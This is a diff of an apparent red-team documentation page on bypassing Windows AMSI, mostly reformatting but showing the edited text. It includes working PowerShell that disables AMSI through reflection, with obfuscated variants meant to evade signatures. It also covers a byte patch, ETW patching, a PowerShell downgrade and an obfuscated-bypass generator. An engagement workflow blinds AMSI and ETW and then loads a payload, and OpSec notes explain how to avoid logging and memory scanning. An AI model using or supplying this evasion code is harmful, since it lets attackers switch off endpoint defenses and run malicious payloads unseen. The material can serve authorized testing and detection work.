@@ -1,13 +1,69 @@
 ---
 title: "AMSI Bypass Techniques"
-date: 2026-03-06
-description: "Seven AMSI bypass techniques covering reflection, byte patching, context corruption, ETW suppression, and hardware breakpoints — with a Python payload generator and blue team detection guidance."
+date: 2026-06-14
+weight: 1
+reading_path: "evasion"
+step: 1
+description: "Seven AMSI bypass techniques covering reflection, byte patching, context corruption, ETW suppression, and hardware breakpoints, with detection guidance."
 tags: ["amsi", "bypass", "powershell", "evasion", "windows", "blueteam"]
 verified: "Windows 11 23H2 · Dec 2025"
 tools: ["PowerShell", "C#", "Python"]
 ---
 
-> **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1562.001](https://attack.mitre.org/techniques/T1562/001/) (Impair Defenses: Disable or Modify Tools) and [T1059.001](https://attack.mitre.org/techniques/T1059/001/) (PowerShell). For disabling Defender beyond AMSI — ETW patching, registry disable, and PPL process termination — see [Defender Bypass](/docs/redteam/defender-bypass).
+> **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1562.001](https://attack.mitre.org/techniques/T1562/001/) (Impair Defenses: Disable or Modify Tools) and [T1059.001](https://attack.mitre.org/techniques/T1059/001/) (PowerShell). For disabling Defender beyond AMSI — ETW patching, registry disable, and PPL process termination — see [Defender Bypass](/docs/redteam/defender-bypass/).
+
+---
+
+## How Does AMSI Work?
+
+Before breaking it, understand what you're breaking.
+
+AMSI (Antimalware Scan Interface) is a Windows API introduced in Windows 10. It creates a bridge between script runtimes and the installed AV engine. When PowerShell, WSH, VBScript, or a .NET application wants to execute content, it calls into `amsi.dll`, which routes the content to the registered AV provider for inspection before execution happens.
+
+```mermaid
+sequenceDiagram
+    participant S as PowerShell / WSH / VBScript / .NET
+    participant A as amsi.dll (in the calling process)
+    participant P as AV provider (Defender, etc.)
+    S->>A: AmsiInitialize(), AmsiOpenSession()
+    S->>A: AmsiScanBuffer(content)
+    A->>P: IAmsiProvider::Scan()
+    P-->>A: AMSI_RESULT
+    alt CLEAN / NOT_DETECTED
+        A-->>S: execution continues
+    else DETECTED
+        A-->>S: ExecutionPolicy throws, content blocked
+    end
+```
+
+Because `amsi.dll` is loaded *inside* the calling process, it can be patched from within — the basis for every bypass below.
+
+**Key functions in amsi.dll:**
+
+| function | purpose |
+|----------|---------|
+| `AmsiInitialize` | Creates AMSI context |
+| `AmsiOpenSession` | Opens a scanning session |
+| `AmsiScanBuffer` | Scans a byte buffer, the primary target |
+| `AmsiScanString` | Scans a string (calls ScanBuffer internally) |
+| `AmsiCloseSession` | Closes session |
+| `AmsiUninitialize` | Destroys context |
+
+**AMSI_RESULT values:**
+
+```c
+typedef enum AMSI_RESULT {
+    AMSI_RESULT_CLEAN             = 0,
+    AMSI_RESULT_NOT_DETECTED      = 1,
+    AMSI_RESULT_BLOCKED_BY_ADMIN  = 16384,
+    AMSI_RESULT_DETECTED          = 32768
+};
+```
+
+Every bypass technique targets one of three things:
+1. **The function itself** — patch `AmsiScanBuffer` to always return clean
+2. **The initialization** — force AMSI to fail its setup so it skips scanning
+3. **The context** — corrupt the AMSI context structure so calls are silently dropped
 
 ---
 
@@ -35,7 +91,7 @@ Host Machine
 
 ### Windows VM Configuration
 
-**1. Install Sysmon (telemetry)**
+**1. Install [Sysmon](/docs/blueteam/lolbins-hunting/) (telemetry)**
 ```powershell
 # download SwiftOnSecurity config
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" `
@@ -104,70 +160,11 @@ For each bypass technique, follow this sequence:
 
 ---
 
-## How AMSI Works
-
-Before breaking it, understand what you're breaking.
-
-AMSI (Antimalware Scan Interface) is a Windows API introduced in Windows 10. It creates a bridge between script runtimes and the installed AV engine. When PowerShell, WSH, VBScript, or a .NET application wants to execute content, it calls into `amsi.dll`, which routes the content to the registered AV provider for inspection before execution happens.
-
-``` {linenos=inline}
-PowerShell / WSH / VBScript / .NET
-          │
-          │  AmsiInitialize()
-          │  AmsiOpenSession()
-          ▼
-      amsi.dll                         ← lives in the calling process
-          │                               can be patched from within
-          │  IAmsiProvider::Scan()
-          ▼
-   AV Provider (Defender, etc.)
-          │
-          │  AMSI_RESULT
-          ▼
-      amsi.dll returns result
-          │
-      ┌───┴──────────────────┐
-      │                      │
-  CLEAN / NOT_DETECTED    DETECTED
-      │                      │
-  execution continues    ExecutionPolicy
-                         throws exception
-```
-
-**Key functions in amsi.dll:**
-
-| function | purpose |
-|----------|---------|
-| `AmsiInitialize` | Creates AMSI context |
-| `AmsiOpenSession` | Opens a scanning session |
-| `AmsiScanBuffer` | Scans a byte buffer, the primary target |
-| `AmsiScanString` | Scans a string (calls ScanBuffer internally) |
-| `AmsiCloseSession` | Closes session |
-| `AmsiUninitialize` | Destroys context |
-
-**AMSI_RESULT values:**
-
-```c
-typedef enum AMSI_RESULT {
-    AMSI_RESULT_CLEAN             = 0,
-    AMSI_RESULT_NOT_DETECTED      = 1,
-    AMSI_RESULT_BLOCKED_BY_ADMIN  = 16384,
-    AMSI_RESULT_DETECTED          = 32768
-};
-```
-
-Every bypass technique targets one of three things:
-1. **The function itself** — patch `AmsiScanBuffer` to always return clean
-2. **The initialization** — force AMSI to fail its setup so it skips scanning
-3. **The context** — corrupt the AMSI context structure so calls are silently dropped
-
----
-
-## Bypass 1 — Reflection: Force Init Failure
+## Bypass 1: Reflection (Force Init Failure)
 
 The oldest documented bypass (Matt Graeber, 2016). PowerShell's internal `AmsiUtils` class has a field `amsiInitFailed`. When set to `true`, PowerShell skips AMSI initialization entirely for the rest of the session.
 
-### Classic (heavily signatured — for reference only)
+### Classic (heavily signatured, for reference only)
 
 ```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
@@ -175,7 +172,7 @@ The oldest documented bypass (Matt Graeber, 2016). PowerShell's internal `AmsiUt
 
 Defender has had signatures for this exact string since 2017. It's included here only for historical context. Don't use it verbatim.
 
-### Obfuscated variant — string splitting
+### Obfuscated variant: string splitting
 
 ```powershell
 # split the sensitive strings so AMSI never sees the full token
@@ -186,7 +183,7 @@ $d = $c.GetField('amsiIn' + 'itFailed', 'NonPublic,Static')
 $d.SetValue($null, $true)
 ```
 
-### Obfuscated variant — char array construction
+### Obfuscated variant: char array construction
 
 ```powershell
 $str = [char[]]@(65,109,115,105,85,116,105,108,115) -join ''
@@ -201,7 +198,7 @@ $field = $type.GetField(
 $field.SetValue($null, $true)
 ```
 
-### Obfuscated variant — environment variable smuggling
+### Obfuscated variant: environment variable smuggling
 
 ```powershell
 # store sensitive strings in env vars — never appear in script body
@@ -225,7 +222,7 @@ Write-Host "[+] AMSI bypass active — no exception thrown"
 
 ---
 
-## Bypass 2 — AmsiScanBuffer Byte Patch
+## Bypass 2: AmsiScanBuffer Byte Patch
 
 The surgical approach. Locate `AmsiScanBuffer` in the process's loaded `amsi.dll`, flip the protection on that memory page to writable, overwrite the function prologue with a `ret` stub that always returns `E_INVALIDARG`, and flip protection back.
 
@@ -308,7 +305,7 @@ Invoke-AMSIPatch
 
 ---
 
-## Bypass 3 — AMSI Context Corruption
+## Bypass 3: AMSI Context Corruption
 
 `AmsiScanBuffer`'s first parameter is an `HAMSICONTEXT` handle. PowerShell stores this handle in the same `AmsiUtils` class we used in Bypass 1. If we zero the handle out, every call to `AmsiScanBuffer` receives a null context. The function validates this and returns `E_INVALIDARG` without scanning anything.
 
@@ -344,7 +341,7 @@ Invoke-ContextCorrupt
 
 ---
 
-## Bypass 4 — ETW Patch (Telemetry Blindfold)
+## Bypass 4: ETW Patch (Telemetry Blindfold)
 
 AMSI isn't the only thing watching. Event Tracing for Windows (ETW) captures PowerShell execution events independently, feeding data to Defender and SIEM solutions even when AMSI is bypassed. `EtwEventWrite` in `ntdll.dll` is the function that sends these events. Patch it to return immediately and you go dark on both fronts.
 
@@ -383,12 +380,12 @@ Invoke-ETWPatch
 ```
 
 {{< callout type="warning" >}}
-**Session collision:** This block compiles a class named `NAPI` via `Add-Type`. The ETW patch in [Defender Bypass](/docs/redteam/defender-bypass) compiles a class named `ETWPatch` with the same function signatures. Both classes can coexist in a session since their names differ. However, running either `Add-Type` block a second time in the same session will fail with a type-already-defined error — `Add-Type` compiled types are session-persistent. If you hit this error, start a fresh PowerShell session or rename the class before re-running.
+**Session collision:** This block compiles a class named `NAPI` via `Add-Type`. The ETW patch in [Defender Bypass](/docs/redteam/defender-bypass/) compiles a class named `ETWPatch` with the same function signatures. Both classes can coexist in a session since their names differ. However, running either `Add-Type` block a second time in the same session will fail with a type-already-defined error — `Add-Type` compiled types are session-persistent. If you hit this error, start a fresh PowerShell session or rename the class before re-running.
 {{< /callout >}}
 
 ---
 
-## Bypass 5 — Hardware Breakpoint Bypass
+## Bypass 5: Hardware Breakpoint Bypass
 
 The most evasive technique on this list. Instead of modifying any bytes in memory (which memory integrity scanners can detect), hardware breakpoints use the CPU's debug registers (DR0–DR7) to intercept execution at a specific address and redirect it.
 
@@ -538,7 +535,7 @@ class HWBPAmsiBypass {
 
 ---
 
-## Bypass 6 — .NET / C# In-Process Patch
+## Bypass 6: .NET / C# In-Process Patch
 
 For engagements where you're operating from a .NET assembly (loaded via `Assembly.Load()` from a previous stage), patch AMSI from inside the managed process before loading any additional content.
 
@@ -640,7 +637,7 @@ $asm = [Reflection.Assembly]::Load($payloadBytes)
 
 ---
 
-## Bypass 7 — PowerShell Downgrade Attack
+## Bypass 7: PowerShell Downgrade Attack
 
 PowerShell 2.0 predates AMSI. It has no AMSI integration, no Script Block Logging, no Constrained Language Mode awareness. If it's still installed (which it is on most enterprise boxes, as it's a Windows Feature and not easily removed), drop into it.
 
@@ -662,7 +659,7 @@ if ($PSVersionTable.PSVersion.Major -lt 3) {
 
 ---
 
-## Tool — Obfuscated Bypass Generator (Python)
+## Tool: Obfuscated Bypass Generator (Python)
 
 Generates permuted, obfuscated versions of the reflection bypass to avoid static AMSI signatures on the bypass code itself.
 
@@ -878,6 +875,15 @@ python3 amsi_bypass_gen.py --test-all
 
 ## Full Engagement Workflow
 
+The four stages run in order: fingerprint the host, blind AMSI, blind ETW, then load the payload into the now-unwatched process.
+
+```mermaid
+flowchart TD
+    S1["Stage 1 — Pre-flight\nconfirm PS version, AMSI state, x64 process"] --> S2["Stage 2 — Apply bypass\ncontext corrupt: null the amsiContext field"]
+    S2 --> S3["Stage 3 — Suppress ETW\nInvoke-ETWPatch blinds the telemetry channel"]
+    S3 --> S4["Stage 4 — Load payload\nAssembly.Load reflectively, AMSI won't scan, ETW won't report"]
+```
+
 ### Stage 1: Pre-flight
 
 ```powershell
@@ -938,7 +944,7 @@ $asm.GetType('Payload.Runner').GetMethod('Go').Invoke($null, $null)
 
 ## OpSec Notes
 
-- **Script Block Logging** (EID 4104) captures the bypass code itself before AMSI runs — meaning even a working bypass gets logged. Apply your bypass via an already-running session where SBL is already bypassed, or deliver via a non-PS vector (HTA, WSF, InstallUtil) that AMSI doesn't hook.
+- **Script Block Logging** (EID 4104) captures the bypass code itself before AMSI runs — meaning even a working bypass gets logged. Apply your bypass via an already-running session where SBL is already bypassed, or deliver via a non-PS vector (HTA, WSF, [InstallUtil](/docs/applocker/bypass-assembly-load/)) that AMSI doesn't hook.
 - **Obfuscate the bypass, not just the payload.** AMSI now has signatures for common bypass strings (`amsiInitFailed`, `AmsiUtils`, `amsiContext`). Use the generator above or hand-obfuscate before delivery.
 - **AMSI provider matters.** Not every endpoint uses Defender. CrowdStrike, SentinelOne, and Carbon Black have their own AMSI providers that may patch differently or not at all. Always test on an environment that matches the target's AV stack.
 - **Memory scanning.** Modern EDR products periodically scan process memory for known-bad byte sequences — including AMSI patch stubs. The hardware breakpoint technique sidesteps this entirely since no memory is modified.
